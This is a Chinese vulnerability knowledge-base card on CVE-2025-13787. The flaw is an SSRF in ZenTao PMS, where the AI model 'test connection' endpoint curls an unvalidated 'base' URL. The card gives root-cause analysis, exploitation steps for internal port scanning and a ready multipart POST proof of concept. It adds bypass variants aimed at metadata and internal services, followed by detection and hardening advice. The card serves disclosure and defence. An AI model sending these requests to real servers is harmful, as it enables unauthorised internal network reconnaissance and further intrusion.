---
id: web-generic-ssrf-zentao-ai-model-test-connection
title: 禅道 AI 模型测试连接 base 参数无校验：服务端 curl 任意 URL 探测内网端口
type: scenario
domain: web
path: web/generic/ssrf
technique: zentao-ai-model-base-url-ssrf
tags:
- php
- zentao
- ssrf
- ai
- internal-network
- port-scan
- cve-2025-13787
cve:
- CVE-2025-13787
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V57
  verified_at: '2026-11-05T08:58:55+08:00'
  notes: '已对照原文与图01/02核对：module/ai/control.php modelTestConnection 在 vendor=openaiCompatible 时触发 converse→makeRequest，base 经 sprintf(''%s/%s'') 拼成 {base}/chat/completions 后直接 curl_setopt(CURLOPT_URL)，无协议/IP 校验且 SSL_VERIFYPEER=false；图01开放端口回显 JSON decode error: Syntax error，图02关闭端口回显 Failed to connect to 127.0.0.1 port 8005: Connection refused，端口探测可观测，与卡内一致。CVE-2025-13787 与原文一致。原文请求携带 admin 会话，卡内已注明未证明未授权调用。原文仅给测试环境 21.7.6-85642、未给受影响区间，已按 brief clear affected_versions（卡内触发条件仍保留原文测试版本说明）。PoC未在本机执行；frontmatter无sources/source_url（全库惯例）。'
url: /docs/web/generic/ssrf/web-generic-ssrf-zentao-ai-model-test-connection/
draft: false
kb_aliases:
- 禅道 AI 模型测试连接 SSRF
- ZenTao modelTestConnection SSRF
- CVE-2025-13787
- base 参数 SSRF
- openaiCompatible 接口探测
---

## 一句话结论

禅道 AI 模型的“测试连接”接口把请求体中的 `base` 直接拼进后端模型 URL 并交给 `curl_exec`，未做协议、域名或内网 IP 校验；已登录用户可让服务器向任意内网地址发起 POST 请求，并根据“连接被拒绝”与“JSON 解析失败”等不同回显判断目标端口是否开放。

## 原理

- 入口：`module/ai/control.php` 的 `modelTestConnection()` 接收 POST 参数并写入模型配置；当 `vendor=openaiCompatible` 时立即调用 `converse()`，进而进入 `module/ai/model.php` 的 `makeRequest()`。
- URL 拼接：`makeRequest()` 中 `sprintf($format, rtrim($this->modelConfig->base, '/'), $this->config->ai->openai->api->methods[$type])`，`format` 为 `%s/%s`，最终请求 `{base}/chat/completions`。`base` 完全来自用户输入。
- 请求执行：`curl_init()` 后直接 `curl_setopt(CURLOPT_URL, $url)`，没有校验 scheme/host/IP，也没有禁用内网地址；同时 `CURLOPT_SSL_VERIFYPEER=false`，可访问自签名 HTTPS 内网服务。
- 差异回显：目标端口关闭时 curl 返回 `Failed to connect to 127.0.0.1 port 8005: Connection refused`；目标端口开放但响应不是合法 JSON 时返回 `JSON decode error: Syntax error`。两种错误可区分端口/服务状态，形成可观测的 SSRF。
- 接口在未安装 AI 插件时仍可被调用，攻击面不只限于已启用 AI 功能的实例；但原文请求携带登录会话，未证明可未授权调用。

## 触发条件

- 目标为受影响的禅道 PMS（原文在 21.7.6-85642 测试）。
- 攻击者拥有有效登录会话（原文 PoC 使用 admin Cookie 与 Basic 认证头）。
- 目标可从服务器侧访问待探测的内网地址；出站 HTTP 未被全局代理/防火墙完全阻断。
- 请求体包含 `vendor=openaiCompatible`、`type=openai-gpt35`、`base=<目标 URL>` 等字段。

## 利用步骤

1. 登录禅道，获取有效会话 Cookie（及产品要求的认证头）。
2. 向 `/zentao/ai-modelTestConnection.html` 发送 multipart POST，`vendor` 设为 `openaiCompatible`，`base` 设为待探测地址，如 `http://127.0.0.1:8005`。
3. 观察响应：`Connection refused` 表示端口关闭/不可达；`JSON decode error`、HTTP 状态差异或响应耗时差异表示端口开放或服务存在。
4. 更换 `base` 的 host/port 批量探测内网资产；可进一步访问内网 HTTP 服务上 `{base}/chat/completions` 路径，观察状态码、错误与耗时。
5. 结合响应内容识别服务类型与版本，绘制内网拓扑。

## PoC

```http
POST /zentao/ai-modelTestConnection.html HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="name"

SSRFTest
------Boundary
Content-Disposition: form-data; name="type"

openai-gpt35
------Boundary
Content-Disposition: form-data; name="vendor"

openaiCompatible
------Boundary
Content-Disposition: form-data; name="key"

test123
------Boundary
Content-Disposition: form-data; name="base"

http://127.0.0.1:8005
------Boundary--
```

端口关闭回显：

```json
{"result":"fail","message":"连接失败: Failed to connect to 127.0.0.1 port 8005: Connection refused"}
```

端口开放但非 JSON 回显：

```json
{"result":"fail","message":"JSON decode error: Syntax error"}
```

## 变体与关联

- 变体：把 `base` 指向云元数据地址、内网管理后台或未授权 API，观察 `{base}/chat/completions` 路径的响应；POST 方法与自定义 JSON body 可能触发部分内网接口的副作用。
- 变体：利用 DNS 名称、十进制/八进制 IP、重定向等绕过若后续版本增加黑名单。
- 关联：[[web-generic-ssrf-zentao-webhook-file-protocol-arbitrary-read]]（同产品另一处 SSRF，可读文件）；[[web-generic-ssrf-ip-notation-blacklist-bypass]]、[[web-generic-ssrf-url-parser-differential-allowlist-bypass]]。

## 检测与防御

- 检测：`/ai-modelTestConnection.html` 请求中 `base` 指向环回/内网/元数据地址；响应出现 curl 连接错误或 JSON 解析错误；同一账号短时间大量不同 host/port 的测试连接请求。
- 防御：对 `base` 做 URL 解析与白名单校验，只允许 `https://` 及可信模型服务域名；解析后校验 IP 不属于内网/环回/链路本地/元数据网段；禁止跟随重定向。
- 防御：设置 `CURLOPT_PROTOCOLS` 仅允许 HTTP/HTTPS，开启 SSL 校验；出站请求走统一代理并限制可达网段。
- 防御：未使用 AI 功能时移除/禁用该接口，或至少要求管理员权限并记录审计日志。
